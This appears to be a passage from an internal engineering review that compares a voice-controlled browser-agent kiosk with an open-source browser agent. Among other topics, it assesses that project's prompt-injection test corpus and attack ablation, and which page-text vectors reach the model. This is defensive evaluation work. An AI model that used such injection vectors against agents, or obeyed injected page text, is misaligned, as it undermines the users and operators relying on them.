**Say what changed when a line ends not done.** Their end lines come from a fixed table keyed on recorded facts, never page content: `consequential` gives "I did part of the work… check the page", and only a recorded dispatch may say "I submitted": `repo:src/chrome/src/agent/terminal-messages.js:L49-L98`. Our table is good and short, with the next line attached (`ours:src/core/command/spokenFailure.ts:L38-L58`), and has no clause for what changed. "I couldn't finish that." is said after up to five fired actions (`ours:src/main/run/commandRunner.ts:L2703-L2711`). From 2 m, speech is the only report of the page's state.
- `turn-mvtiircy-vq`, `Go to item screen.`: clicked "YouTube Home", opened youtube.com, said "Which item screen do you mean… Ending there."
- `turn-mvqi2ulz-v5`, `Flag it as failure.`: Dislike, More actions, Report, Sign in, ending on accounts.google.com; the sentence is honest about the failure, silent about the clicks, and the record reads `done`.
- `turn-mvsihi98-v17`, `Look this up.`: searched the web for "this"; the end line never says so.

**Adapt, S-M:** when a line ends not done and the address differs or an action fired, code adds one clause from the steps ("I opened youtube.com."). With nothing fired it adds nothing; do not copy "Nothing was changed" as a stock phrase. No stage. Open, question (10), goal (4). The wording is a guess no gate reaches: shortest arm, and the owner's next report settles it. Do not copy their table's words (post-33.0.0).

**Narrating a wait: we're ahead, and take one rule.** Theirs rotates eight filler lines every 3.6 s: `repo:src/chrome/src/ui/sidepanel.js:L14670-L14701`. That is what principle 2 forbids: a dead run looks alive. Ours is stage plus object in the person's words (`ours:src/core/pipeline/stageWords.ts:L34-L71`) with seconds from the work (`ours:src/core/pipeline/runProgress.ts:L131-L177`). **The rule that transfers** is behind their `announce` flag: the channel that reaches someone not looking carries only real change (`repo:src/chrome/src/ui/sidepanel.js:L14718-L14723`). Principle 2 says "every stage bounded and the bound said aloud", and no speech exists at a stuck stage: "still thinking" is screen only (`ours:src/core/pipeline/runProgress.ts:L139-L146`). `stage-loading` runs p50 3.4 s, p95 13.9 s, max 64 s, 8 of 166 over 15 s. **A tie, measure first:** one sentence at a bound could deafen the ear (`ours:src/core/voice/voicePrompt.ts:L44-L52`) while #490 and #512 are open, on overlap (20). Measure on `overlap:gate --road audio`, gate models unless the owner says otherwise. Tied, the cheapest arm is none.

**Keep the answer window open while the person answers.** Theirs renews the deadline as you type: `repo:src/chrome/src/ui/sidepanel.js:L12590-L12624`. Ours is a plain 8 s timer that consults nothing (`ours:src/main/run/commandRunner.ts:L3668-L3693`), while `end-of-speech` p95 2.0 s and `endpoint-to-words` p95 2.4 s mean a line can spend about 4.4 s reaching the runner. The refusal is safe; the cost is that "yes" then runs as a new Command after "Ending there". **Adapt, S:** pause the timer while the ear is `hearing` or `transcribing`. Shown by reading: one question back in the logs, answered at 2.3 s. Goal (4).

**Name a line that works, not `Try “help”`.** For `unsure`, `notFinished` and a refused ref, the next line is `help` (`ours:src/core/command/tryLine.ts:L33-L50`): about 30 lines, and about 16 lines of 65 px type fit a 1080p panel (`ours:src/core/command/help.ts:L5-L33`; how the Feed renders it not checked). `No response. The words couldn't be read. Try “help”.` for `Play Made in Romania.`, where the good next line was the same line. **Adapt by kind, M:** pick by what kinds of ref the page holds, only lines the Local Match takes as they stand; if the host failed, say to say it again. End line only. Their chips are host regexes (`repo:src/chrome/src/ui/recommended-actions.js:L343-L343`), excluded.

**Who decides when nobody answers? We're ahead.** Their clarify times out at 60 s and answers itself (`repo:src/chrome/src/agent/clarify-timeout.js:L47-L51`), and **an unanswered plan is approved after 2 minutes** (`repo:src/chrome/src/agent/agent.js:L23590-L23593`). Wrong for an appliance with a person who may have left the room. Silence refuses, in ours: `ours:src/core/errand/confirmClass.ts:L93-L96`. Keep their honesty rule, which we already follow: an automatic choice is never recorded as the person's (`ours:src/core/errand/errandMemory.ts:L85-L87`).

**Ignore.** Run journal and reconnect (`repo:src/chrome/src/run-reconnect.js:L86-L125`): a service worker dies, our main owns the run. Reading-first scroll, slash commands, shortcuts, about 1,400 localisation keys (their terminal messages are hard-coded English anyway), streaming, error dedupe, confetti, the edge effect and a Stop button that cannot be said (`repo:src/chrome/src/content/agent-visual-indicator.js:L1609-L1628`).

**We're ahead.** Waits from the work. Control labels and hosts on stages, against selectors and indexes (`repo:src/chrome/src/ui/sidepanel.js:L3920-L3925`). Every failure names what to say next (`ours:src/core/command/tryLine.ts:L79-L83`). The screen says whether speaking now will be heard (`ours:src/core/voice/voicePrompt.ts:L39-L72`). Status type at 65 px.

**One thing found on the way, ours.** `STUCK_STAGE_MS` is marked a guess, set at dev p95 (`ours:src/core/pipeline/runProgress.ts:L121-L137`), and on the kiosk thinking passes it 17.6 %, acting 12.8 %, loading 22.3 %. So "still…" shows about one stage in six, the crying wolf principle 2 warns about. Re-date after #439's spans, since these logs mix builds. Also: `render-process-gone` is handled only for the pane (`ours:src/main/browser/createBrowserPane.ts:L295-L295`), so a crashed app renderer has no recovery and nothing would report it.

### Integrations

Almost nothing here bears on a spoken scenario: this is their reach outward, and we have no outward surface. Nothing changes a state, so nothing is a yield claim. Licences per package are in section 7.

| feature | what it is | call |
|---|---|---|
| Six task-level MCP tools | Start, poll, respond, abort: `repo:mcp-server/src/index.ts:L53-L411` | Ignore. "The gate is in the loop, not in `executeTool`" is true (`repo:src/chrome/src/agent/agent.js:L17498-L17539`). "Delegation is cheaper" is argued, never measured. The boundary holds only if the caller behaves: a prompt's answer comes back over the same socket, and the only stop is tool text, "Never infer permission" (`repo:mcp-server/src/index.ts:L298-L305`) |
| `needs_user_input` kinds | Unknown kind withholds the question: `repo:mcp-server/src/runs.ts:L225-L234` | Ignore. Ours are text prefixes parsed by gates (`ours:scripts/goal-gate.ts:L270-L288`), only a tidy-up |
| Pairing, mutual HMAC, per-socket approval | HMAC `repo:src/chrome/src/offscreen/cloud-bridge.js:L135-L166`, pairing `repo:src/chrome/src/offscreen/cloud-bridge.js:L241-L255`, approval `repo:src/chrome/src/offscreen/cloud-bridge.js:L259-L272`. With no token set nothing is checked before a command runs: `repo:src/chrome/src/offscreen/cloud-bridge.js:L289-L297` (read, and stated in their doc, not run) | **We're ahead:** no port, nothing to pair (`ours:src/main/browser/createCdpBrowserController.ts:L109-L109`). If a socket is ever added, take the shape |
| `webbrain-workflow/1` | See Reuse. Score under 7 is a miss, a tie is `ambiguous`: `repo:src/chrome/src/agent/workflows.js:L962-L1002` | Ignore. **Keep one question for the next Errand review:** "may have run, so do not repeat" (`repo:src/chrome/src/agent/agent.js:L47248-L47251`). Whether our outcome string separates "not fired" from "fired, result unseen" was not read |
| WebMCP | Page-registered tools, opaque ids, fresh confirmation every call: `repo:src/chrome/src/agent/agent.js:L34467-L34473` | The one integration that fits our direction: a page-declared op is a fact by kind, like ADR 0080. Only tools whose inputs are a Choice or Slot fit Jev. Ignore until a read-only check shows a page on the owner's day registers one (H1). Their test needs Chrome flags: `repo:test/webmcp-e2e.mjs:L23-L23`. Electron 43 support unverified |
| firefox-companion, webbrain-systray, lmstudio-plugin, `webbrain-config/1`, ATIF and OTLP converters | Outward reach | Ignore |

**The one worth building: stamp the build on each record.** `webbrain-trace/1` says what wrote each run (`repo:src/chrome/src/trace/run-header.js:L1-L30`). Ours stamps perf only (`ours:src/main/perf/attachAppTelemetry.ts:L43-L48`); decision records have no build field (`ours:src/core/command/decisionRecord.ts:L81-L90`). The 10-day logs hold **41 stamped runs across 24 builds**, and `perf:report`'s stage table pools them, so a Tier number mixes builds before and after a fix. Decision and perf files of a run join only by time. **Adapt, S:** a build field on each decision and ask record, and a split in `perf:report`. Off the Command path, no stage. Serves #439. Sizing it runs free on existing logs (H2). Do not adopt their three-layer versioning.

**The harness cannot reproduce `overlap`.** Lines queue (`ours:src/main/cli/runCliHarness.ts:L183-L185`); `overlap:gate` uses IPC instead (`ours:scripts/overlap-gate.ts:L12-L14`). `yield.md` names the CLI harness as how a state is set while that row's evidence comes from the gate, so the doc lags the practice (section 6).

**We're ahead.** No open port. The harness takes the real road and reaches a primitive (`ours:src/main/cli/runCliHarness.ts:L7-L16`), where their MCP stops at task level. Whole asks replay against any model.

### Quality: how they measure

**Correction:** the finding's "Jev answered 418 asks, p50 584 ms" pools two models; see Decisions for the split. Their per-model results below are their saved files, not a measurement of ours. Reuse of their sets is in the benchmark question at the end of this section.

| layer | scores | model in the loop? |
|---|---|---|
| `test/*.mjs`, `test/run.js`, 7 CI shards, manual dispatch only (`repo:.github/workflows/main.yml:L3-L4`); 9,765 cases, 65.16 % line coverage (audit, doc) | pass or fail | **no**, scripted fake providers |
| `test/quality/*-mv3`, 57 files | exact effect counts on owned pages | no, scripted loopback models (doc) |
| `test/security`, 27 payloads × 2 builds | 5 boundary invariants | no |
| `test/llm`, 100 questions, 111 scenarios, 487 MB of saved runs | **first tool call only** (`repo:test/llm/lib/score.mjs:L100-L148`) | yes, one turn; "does not execute tool calls" (doc) |
| `test/llm-tiny`, `v2` | whole-run pass from fixture state | yes |
| `ci/`, 14 scenarios on their Cloud | weighted checks, `stuck_at` (`repo:ci/lib/grader.mjs:L81-L100`) | yes, manual trigger |
| `website-tests`, 8 live flows | independent receipts | not yet exercised live (doc) |
| `test/jev`, 120 paired attempts | p50 and p95, wrong and repeated actions | designed, **never run** |

**They score code under a fake model and a model on one step. They do not score how long the person waits, how often someone repeats themselves, or how common a failing case is.** Their own audit: the full-suite pass "does not qualify a real-model user-Chrome task" (`docs/quality-audit-2026-10-07.md` L22, doc). A large suite measuring its own scripted model.

**Ablation (their design, good; their result, weak).** 8 attacks wrapped and raw, 2 controls, `safety% = 1 - anti/scored` (`repo:test/llm/safety-report.mjs:L71-L74`). Count over their saved files: **2 obeyed of 337 wrapped, 0 of 295 raw** (per-case recount 2 of 345, 0 of 303; 57 and 47 runs, not paired). **So it cannot show the wrapper helps: the raw arm scored better.** Either nearly every model resists or the corpus cannot tell. The grader flatters: `other` counts as safe, `empty` and `no_tool` count as scored though the README says otherwise (`repo:test/llm/README.md` L370), anti-patterns are literal, and it sees one step.

**Which of their vectors reach our card (read, not run).**

| vector | reaches the card? | where |
|---|---|---|
| `aria-label`, `placeholder`, `title`, `alt`, `aria-describedby` on a visible control | **yes**, as label or `description=` | `ours:src/main/browser/collectPageScript.ts:L306-L325`, `ours:src/core/browser/refStates.ts:L66-L73` |
| title, text in view, table cells | **yes**, JSON-quoted | `ours:src/core/command/jevReading.ts:L1018-L1023` |
| `display:none`, `visibility:hidden`, `noscript`, JSON-LD, `script`, HTML comment | no | `ours:src/main/browser/collectPageScript.ts:L296-L300`, `ours:src/main/browser/collectPageScript.ts:L41-L42` |
| Bidi override, zero-width, Unicode tag characters | **no stripping found** | searched `src/core`, `src/main`; no non-test hit |
| Breakout of a boundary | no: JSON-quoted, whitespace collapsed | `ours:src/core/command/jevReading.ts:L289-L294` |

We already drop the hidden-text class that motivates their corpus, for other reasons (#391), and no test pins it as a safety property.

**Worth taking.**
- **An owned lab where the page, not the agent, records what happened** (`repo:test/jev/workflows.mjs:L11-L11`, `repo:test/llm-tiny-v2/lib/scoring.mjs:L14-L14`). Their oracle cannot false-red; judge false reds are on record for us, and 5 goal cases fail only on sign-in walls. Ours measures real sites, which theirs mostly avoid. **Adapt, two parts.** (a) A `fired` exact check on overlap cases, S: no action fires more than its line asks, read from `command` records; it reaches `8-split-by-pause` (#510), and kept `overlap:gate --keep` runs can be re-read with no new calls. I found no such check. (b) A loopback goal lab with a server recording what arrived, M: sign-in-free goal cases, a declined confirm that must leave no effect, hostile pages. A request to the local attacker host is an exact red. T9 ran the guard path only; this is what would measure a model.
- **Pre-named acceptance rule** in `test/jev`: ≥ 25 % lower median, no lost success. `AGENTS.md` already demands it.

**We're ahead.** Yield weighs by the owner's day, with no counterpart there. A ledger from real use: 277 lines, 73 open, by first failing stage. Felt Reaction measured from the last speech frame. A gate model's miss counts against the card, on deterministic free models. `overlap:gate` and `stt:gate` have no counterpart found. `pnpm gates` treats a skip as red. Temperature 0.15 and one sample a case on theirs, `--repeat N` on ours.

**Where we fall short of our own claim.** Commands between Frustrations is not computed: `grep -i frustration` over `src`, `scripts`, `e2e` finds nothing. The only figure is the hand count, 36 of 181. The parts are there and unsummed; S for the sum, M with a repeat heuristic. Section 6.

**Proposed:** `hostile page` (`undated`; zero hits for three override phrases in 10 days; only a test can date it).

### Firefox against Chrome

**Bearing on us: none on a normal day.** Our pane is Electron over CDP, so we are on the Chrome side of every row. Section 3 uses this to correct the README; here is only what it does not need. A browser-to-browser diff, nothing run, absences rest on greps.

- **Size of the fork.** "Nearly all agent code is shared" (`repo:README.md:L267-L269`) is overstated: of 298 shared JS paths, 249 are identical and 49 differ, including the core. `agent.js` is 60,758 lines against 51,547 (`diff` counts moved blocks, so divergence is overstated, but the 9,211-line gap is real). 73 tools against 64; Firefox has none Chrome lacks.
- **README Known issues, 15 claims.** 8 true (one trivially), 1 true but incomplete, 3 true in part or for one mode, 1 stale, 1 false, 1 misleading. "No shadow-DOM piercing" is false as written: open roots are walked (`repo:src/firefox/src/content/content.js:L1257-L1282`). "No real trusted mouse events" is false with the opt-in BiDi companion (`repo:firefox-companion/session.mjs:L670-L674`), though drag, wheel and multi-clicks stay synthetic in vision mode (`repo:src/firefox/src/bidi/client.js:L33-L43`). "SPAs may fail to trigger re-injection" misleads: every re-injection caller follows a failed content message, for example a null reply (`repo:src/firefox/src/agent/agent.js:L47764-L47772`, `repo:src/firefox/src/agent/agent.js:L47846-L47852`), and no navigation listener injects; the manifest still loads the scripts on each full-document load.
- **Worst gaps, not on their list:** WebMCP always refuses (`repo:src/firefox/src/agent/agent.js:L43288-L43296`), no in-browser WebGPU (a stub that throws: `repo:src/firefox/src/providers/webgpu-decision.js:L1-L5`), nine Dev tools, no native dialog handling in standard mode, no spoken input.
- **Firefox ahead:** `tabs.captureTab` needs no activation (`repo:src/firefox/src/run-capture.js:L57-L59`); an added DNS check on fetched URLs (`repo:src/firefox/src/network/network-tools.js:L345-L356`).
- **One idea seen in passing, also in Integrations:** report a dispatch as sent, not sent or unknown, and refuse to repeat an unknown one (`repo:src/firefox/src/bidi/client.js:L268-L275`).

Electron's own shell, `webContents.debugger`, what real Chrome has and what we fight: **section 3**, which covers `findings/electron-browser.md`; not repeated here.

### Traps: what their history says

**The record** (`git log` at the pin, 7,596 commits, 2026-04-06 to 2026-10-31). `agent.js` went 4,509 lines on May 1, 20,563 on Aug 1, 44,877 on Oct 1, 60,758 on Oct 31, +83,819/−22,796 in total. `test/run.js` is 135,256 lines. 6 real reverts of 7,596: they fix forward. 1,676 commits touched both browsers' `agent.js`, against 226 touching Chrome's alone, so commit counts are inflated by mirroring. Theme counts are in the last question below, and none of them ranks anything.

**`AGENTS.md`'s claim, "that patch holds on the site it was written for and nowhere else, and the next site is the next report": their history supports it strongly.**
- **The next site was the next report, in their words.** A correction after a Mastodon post looped because the code "reads account names only on X and Bluesky" (`repo:CHANGELOG.md:L200-L200`). The recipient guard went from "only Gmail, LinkedIn, and Douyin" to "any site" (`repo:CHANGELOG.md:L993-L993`), to failing open because it looped (`repo:CHANGELOG.md:L1001-L1001`), to a model read (`repo:CHANGELOG.md:L215-L216`).
- **They deleted the rules.** About 160 commits to retire word lists: 50 on 2026-09-08 parsing negation, Portuguese prepositions and CJK segmentation by hand; then about twenty "Read … in any language" commits on 2026-10-14, among them 654d9996b (−2,443 lines, "not verb lists"). "word lists in about a dozen languages": `repo:CHANGELOG.md:L216-L217`. A large independent project reached `AGENTS.md`'s conclusion by paying for it. **We started where they ended.**
- **A patch often does not hold even on its own site.** Gmail result counting took three commits on 2026-08-26, then a move to page structure on 2026-10-14 (780d85764).
- **Growth does not stop:** 50,620 lines on the word-list day, 60,758 seventeen days later. Replacing rules with questions did not shrink the pile, because the guards around the generator remain.
- **Size of the pile:** 156 methods named for completion, evidence, guard, gate or proof, about 7,000 lines (rough spans, groups overlap); about 110 for messaging, 90 for social. `adapters.js` is 18,435 lines, of which **one list of Mastodon hosts is 15,471, 84 % of the file** (`repo:src/chrome/src/agent/adapters.js:L193-L195`).

**Four caveats.** A site headline is not a site patch: `repo:CHANGELOG.md:L115-L115` reads "X", and the fix is by kind. A rule by kind can hold widely: autoconsent clears banners on sites it never named, which fits "by kind". Most adapters are prompt text for a generator, not answers in its place, and whether they earn their keep was not measured. Public users, sends and many languages drive much of this; one English-speaking owner would hit it more slowly, not differently.

**In ours.** Site names in non-test source are few (29 matches in 18 files), mostly news feeds, the Media Engine default and known addresses. The trap's live form is the Player history `AGENTS.md` names, and two lists: `CONSENT_LABEL_RE`, which still decides whether a control carries a consent choice at all (`ours:src/core/browser/dialogPolicy.ts:L8-L21`; see Walls), and `LEAVING_WORDS` (see Safety).

**What `TODOs.md` admits.** Last changed 2026-09-01, about 2,700 commits ago, not their tracker, three entries stale. The real admission: small models need more direction, and "whether the rules alone fix it or whether the model still ignores them" is unknown (`repo:TODOs.md:L26-L38`). **Not admitted anywhere read:** the size of `agent.js`, the guard pile as a cost, or a false-done rate.

**Our own trap with no twin in theirs: a missing option.** A free model can always invent the action; a closed ask cannot. Stage `missing_option`: 37 lines, 6 open, plus `stt` 46 and `turn` 9, which a typed product never meets. Closing the ask moved failures from "claimed falsely" to "not on the card", which widening already answers.

**Correction to the finding:** `traps` calls the 2026-10-25 volume lines spoken. The records say typed (T8), and T8 ties the 4 `collectPage` refusals to those lines by time, since faults carry no turn id. `electron-browser`'s hypothesis on this is superseded: the action was the typed `go back`, `turn-mvocktqm-a`. The last-MIT commit question is section 7.

**Proposed:** `hung page` (`undated`, seen once in the logs on 2026-10-25, not reproduced; one sighting is not a count) and `hostile page during an Errand` (`undated`, no case seen; same as Quality's).

### The three questions

#### Mechanisms that exist only to compensate for LLM unreliability, against problems we will hit too

Read from the findings' "Compensates?" lines. **"We hit it" means the problem is any engine's, and most of the value is there.**

| mechanism | it compensates for | do we have the problem? | call |
|---|---|---|---|
| Page moved under a chosen action, re-choose: `repo:src/chrome/src/agent/page-feedback-recovery.js:L49-L69` | a moving page | **We hit it.** C7, one logged spoken line, plain-line half only | adapt the line |
| Proof, weak evidence, veto after a click: `repo:src/chrome/src/agent/agent.js:L55631-L55690` | a live page | **We hit it.** "appeared" credits page loads | adapt the wording, not the veto |
| Deadline with `outcomeUnknown`: `repo:src/chrome/src/cdp/cdp-client.js:L5346-L5362` | an action that never ends | **We hit it.** 1,745 refusals, 2026-10-25; that case fixed at the pin | C10, no yield claim |
| Readback before a bundled Enter: `repo:src/chrome/src/agent/agent.js:L39442-L39447` | text in the wrong state, a model retrying or a partial firing early | **We hit it** before #398; no logged case since | adapt, insurance |
| Outcome class under `done`: `repo:src/chrome/src/agent/scheduler.js:L1841-L1853` | a generator's prose | **We hit it on the Planner**: `turn-mvqi2ulz-v5` logged `done` | adapt, S |
| `control_effect`, `page_blocker`: `repo:src/chrome/src/agent/semantic-decisions.js:L231-L255` | word lists, not an LLM | **We hit it:** eleven words, one wall line | adapt |
| Nonce box, capability × host gate: `repo:src/chrome/src/agent/permission-gate.js:L9-L20` | a generator that obeys page text | **On the Planner only.** Jev has no output channel. T9 shows the path open, no model shown doing it | owner decides, section 1 |
| Abort on a dead ask, deadline by caller, fallback: `repo:src/chrome/src/agent/agent.js:L9965-L9965` | hosts | **We hit it:** 13 lines on 429s, Mammoth; 0 since on Jev | C11, no yield claim |
| Answer-window keep-alive: `repo:src/chrome/src/ui/sidepanel.js:L12590-L12624` | a timer racing a person | **We hit it**, by reading | adapt, S |
| Build stamp on each record: `repo:src/chrome/src/trace/run-header.js:L1-L30` | mixed evidence | **We hit it:** 24 builds pooled | adapt, S |
| Loop detector, 988 lines: `repo:src/chrome/src/agent/loop-detector.js:L958-L986` | a free model with 130 steps | Tasks no: a closed card with an option removed cannot repeat it. **Errands yes** | a memory line on Errands |
| Completion invariants, about 7,000 lines, a separate judge: `repo:src/chrome/src/agent/completion-invariant.js:L934-L975` | a generator claiming success | No in that form. A smaller form lives: `open voicestudio` yes 0.75 on an empty page (C6, untested) | ignore; facts on the card |
| Plan gate and review: `repo:src/chrome/src/agent/agent.js:L27638-L27642` | a model that drifts | No; five actions, card re-read each hop. ADR 0095 measured it | ignore |
| Text tool-call parsers, 597 lines: `repo:src/chrome/src/agent/tool-call-parser.js:L1-L11` | model output shape | No: Jev answers typed, the Planner is one JSON object or refused | LLM only |
| Quote check, `done_summary`, `summary_kind`: `repo:src/chrome/src/agent/semantic-decisions.js:L617-L626` | hallucination, non-answers | No: Slots are spans of the line, words are the page's | LLM only |
| Tool tiers, prompt tiers, scratchpad, compaction pinning (the citation covers the pinning only): `repo:src/chrome/src/agent/agent.js:L44474-L44477` | prompt size; small models "forget" | No: stateless card, words always on it | LLM only |
| Semantic page retry, duplicate-submit guard, `event_key`: `repo:src/chrome/src/agent/loop-detector.js:L474-L511` | a model retrying, fresh refs read as progress | No | LLM only |
| Saved workflows, `/teach`: `repo:src/chrome/src/agent/workflows.js:L962-L1002` | model cost on repeat work | No: a hop is one Jev call, 264 ms | LLM only |

**Lean mode is the check on this table from their side:** a list of strong models for which they switch the quality guards off, because the guards "can strand a run that was going fine" (`repo:src/chrome/src/agent/lean-mode.js:L1-L8`). Of the thirteen kept, only the readback before Enter applies to us.

#### What they score or benchmark, and whether we could reuse it

They score code under a fake model and a model on one step, never wait or repetition (layers under Quality). **Nothing of theirs runs against our app.** Every scenario asks "what is the next OpenAI tool call, given this history?", and their grader imports their tool lists (`repo:test/llm/lib/score.mjs:L5-L8`). Jev takes a text state and closed questions. **One set is worth rebuilding, in our own words as our own fixtures: the 27-vector list and the 8 attack shapes. Reimplement from the category names, idea only.**

Licences read at the pin (not legal advice): everything GPL-3.0-or-later (`repo:LICENSE:L1-L8`), since the corpora carry no licence of their own. "MIT tag" is whether `v32.2.3` (2026-08-19, `LICENSE` and `package.json` MIT) holds it. Its notice must be kept if copied, and writing our own avoids the question at almost no cost, each payload being one line. For the exact MIT pin see section 7.

| set | files | count, size | MIT tag | adapter's cost | call |
|---|---|---|---|---|---|
| Boundary corpus | `test/security/injection-corpus.mjs` | **27 payloads**, 6 categories plus robustness, 20,159 B | yes, 27 | **S.** Each vector an owned HTML page, then a collector test (`e2e/*.chrome.test.ts`, free, headless) asserting which words reach the card. Of their 5 invariants only "benign data survives" ports | **adapt, idea only** |
| Security scenarios | `test/llm/scenarios/security/{protected,unprotected}/081-100.json` | **20 files, 38.6 KB, really 8 attacks and 2 controls** | yes, 20 | **M.** Click-shaped ones (082, 088, 090) become `fixtures/jev-cases` with `{"question":"action","not":"click-N"}`, which our format takes (`ours:src/core/decision/jevCase.ts:L29-L31`). The 6 URL-shaped need an owned page and a local attacker host. Planner calls on the owner's word | **adapt, idea only** |
| Recovery scenarios | `test/llm/scenarios/NNN.json` | 91 others, 111 in all, 211 KB | 80 of 91 by count | **L per case.** Seeds are synthetic tool output with no page, and `AGENTS.md` wants real lines | ignore the files; class names as a ledger checklist |
| Routing questions | `test/llm/questions/`, `expected/` | **100 pairs**, 49 KB | yes, 100 questions | **S-M, poor value.** About 37 fit our list; yield.md has dated reruns of these kinds | ignore |
| Manual scenarios | `docs/test-scenarios.md` | 12 prose tasks | not checked | none; only 2 are read-only with no account | ignore |
| Cloud catalogue | `ci/catalog/scenarios.json` | 14, 24,480 B | not checked | 6 need their private lab; the grader reads their run API | ignore |
| Authenticated suite | `website-tests/scenarios.mjs` | 8 live flows | not checked | needs two accounts, posts and mail | ignore |
| Tiny lane | `test/llm-tiny/cases.mjs` | 30 fixtures | no | S; no lure, no real page | ignore |
| Tiny v2 | `test/llm-tiny-v2/cases.mjs` | 60 tasks × 3 seeds | no | L; no model scores exist yet (doc) | keep the oracle idea |
| Vision | `test/vision/` | 100 cases, 100 PNG, 12 MB; 4 photos CC0 or public domain | no | not applicable: grades a prose caption | ignore |
| Jev benchmark | `test/jev/workflows.mjs` | 6 pages × 2 arms × 2 browsers × 5 reps = 120 attempts | no | S; toy pages, half the prompts Turkish, **never run** | keep the ledger idea |

**Not assessed:** `test/fixtures`, 57 files including paywall and consent pages, listed only under the brief. They may be the most reusable by-kind pages.

**Hostile cases cannot come from real lines,** since the logs hold none, so they measure the writer. Say so on the record, as `AGENTS.md`'s ties rule requires. The harness to build is the loopback goal lab under Quality.

#### What CHANGELOG and git say they fixed repeatedly

**Orders of magnitude only.** Base 5,511 commits after taking out merges, dist, version and release, 2,162 fix-shaped. Each count is a regex over subjects, `all/fix-shaped`. Themes overlap and do not sum. Precision by a sample of 10 subjects, judged by eye, runs from about 8 in 10 (completion) to about 5 (page races, provider quirks) and lower on stale identity and context size; the rest were not sampled. Mirroring and bot-review rounds inflate everything. Per the Yield rule, they say how a thing breaks, never how much it weighs.

| theme | count | cause | do we share the trap? |
|---|---|---|---|
| Provider and model quirks | ~300/110, every month | LLM, public breadth | Smaller. 18 kiosk faults were Mammoth's 429s, 20 of 550 decisions ended `unavailable`; none on Jev since. Keep the chain, and arm it |
| Rules that read words, retired for a question | ~160/130, 50 in one day | LLM plus SITE, many languages | **Started past it.** Two lists remain, `LEAVING_WORDS` and `CONSENT_LABEL_RE`; we would hit it on any list we grow |
| Chrome and Firefox mirror | ~190/60 | EXT | No |
| Rich-text editors | ~150/100, 36 in one day | ANY, sharpened by SITE | Not seen: 0 of 277 ledger lines mention one, though the ledger records what was tested. Comment goals may reach it |
| Page races, an action that never ends | ~120/70, every month May to October | ANY | **Yes.** 1,745 refusals, 2026-10-25. Case fixed at the pin; the commit-less `back` hole is by reading. C10 |
| Captcha | ~110/60, 33 in one day | theirs alone | No: no solver, no scenario |
| Completion, a model that says done | ~105/75 | LLM; verifying effects is ANY | **A smaller form.** `open voicestudio` (`ours:fixtures/failed-lines/cli-5-mvm5vjrc.json:L7-L7`), C6, untested by T5. Silent done, C5, on typed lines by T4 |
| Context size and compaction | ~100/40, precision low | LLM | Budget instead, one open line (`ours:fixtures/failed-lines/cli-2-mvlhyr1o.json:L7-L7`). Ahead |
| A second line while the first runs | ~100/40, **51 in October, its peak** | LLM for history validity, ANY for the rest | **Yes, in another form.** Overlap is 17/26 on the gate, and the fragment class is C1. Their spike warns this class does not settle |
| Stale element identity | ~70/40, precision low | ANY | Yes, smaller: `runnerUpOf` found the masthead's Settings (`ours:fixtures/failed-lines/turn-mviq8n71-5.json:L7-L7`) |
| Injection, page text reaching the model that writes | ~60/30 | LLM | **On the Errand road only.** No ledger line. Section 1's block |
| Debugger and service worker | ~45/20 | EXT | Debugger only, re-armed on detach (`ours:src/main/browser/createPaneBrowserController.ts:L79-L100`). No service worker |
| Recipient and per-site send guards | ~40/30 recipient; Gmail ~30; LinkedIn ~20 | SITE plus LLM | No sends on a normal day: no spoken line of 492 sends |
| Text tool-call parsing | ~35/15 | LLM | No |
| Consent banners | ~30/15, ending in a vendored rule set that still needed site-named rules (`repo:src/chrome/src/agent/cookie-banner-host.js:L1-L41`) | ANY | **Yes, still moving.** Guardian regressed with 6486d6e1, bbcgoodfood the same way, `dialogPolicy.ts` has 10 commits. Autoconsent before the collect against Jev's choice is a tie to measure, with the bare-label gap under Walls first |
| Loop detection | ~25/10; their thresholds later relaxed (4235874b9) | LLM | Tasks no; Errands, see above |

**What the pattern says.** The themes we share are the ones whose cause is ANY: page races, overlap, walls, stale identity. Those are real, and C1, C7 and C10 sit in them. The largest piles of code, completion guards, tool-call parsing and word lists, are the price of a generator, and most of that price does not fall on the Command path. It does fall on the Errand road, which holds a generator and few of the guards.

## 6. Unverified claims and open questions

### Only you can settle

**What the kiosk pane is signed in to.** Every agent assumed signed out except YouTube. The orchestrator did not read the cookie store. The logs disagree with the YouTube half: `Sign in` is on 0 of 230 YouTube page cards to 10-26, then 53 of 71 from 10-27 09:24 (T8, `findings/measurements.md`). That fits a sign-out, or a build that changed what the collect shows; the two were not separated. No YouTube card falls on 10-30 or 10-31. The answer sets how much the confirm gaps and C32 weigh. It does not change C30, which holds either way (`findings/safety.questions.md`).

**Whether hard-policy safety holes sit outside the Yield order.** Section 1.

**The counts for the 15 Proposed Scenarios.** Section 1.

### Rows in `yield.md` and `reliability.md` that the findings call stale

No state or count was changed here. All of these are read, not rerun.

| row | what is stale | source |
|---|---|---|
| `yield.md` `read` | The grammar's `read` road was removed by a1343fef, 2026-10-30; the row still says "`read` by grammar" and "read it" | `git log` at the pin |
| `yield.md` `wall` | Its lines are claimed fixed by e54518b0, 2026-10-26. It needs a rerun | `candidates.md` section 3 |
| `yield.md` `overlap` | #508 and #510 have code at the pin, and the 17/26 was not rerun after them. The state is set by its gate, though the file names the CLI harness as how a state is set | `candidates.md` section 3 |
| `yield.md` `overlap`, older run | Calls turn-mvs9weqt-1 "unowned". The ledger has it claimed by #504, fixed 3c269fe8. **Found while checking the handoff, 2026-10-31** | `ours/fixtures/failed-lines/` |
| `yield.md` `read` | Says turn-mvixu07l-1 was claimed by #403, "which closed without marking it fixed". The ledger has `fixedBy` 37159dc8. **Found while checking the handoff** | `ours/fixtures/failed-lines/` |
| `yield.md` `play`, `open` | Cite turn-mvk6o6wh-2 as showing how they break. The ledger has it fixed by 9e11e984 (#477). **Found while checking the handoff.** Whether the fix ended that break was not rerun | `ours/fixtures/failed-lines/` |
| `reliability.md` budget rows | The Jev card-size rows, 1,320 and 2,430 ms, are Mammoth's: called so by date and matching numbers, since the doc names no model. Jev measures p50 264 ms, p95 520 ms, n=146 | `findings/decisions.md`, `ours:docs/agents/reliability.md:L42` |
| `reliability.md` L87 | "`perf:report` counts every part but the repeat today." See below: no part is summed into the headline | `ours:docs/agents/reliability.md:L85-L87` |

### Whether Commands between Frustrations is computed anywhere

**It is not.** A case-insensitive grep over the `.ts` files in `src`, `scripts` and `e2e` finds no `frustration` (re-checked 2026-10-31), and `kiosk-perf-report.txt` has no such line. The only figure is the hand count in `reliability.md`, about one Command in five followed by a repeat, 36 of 181. The parts are not summed.

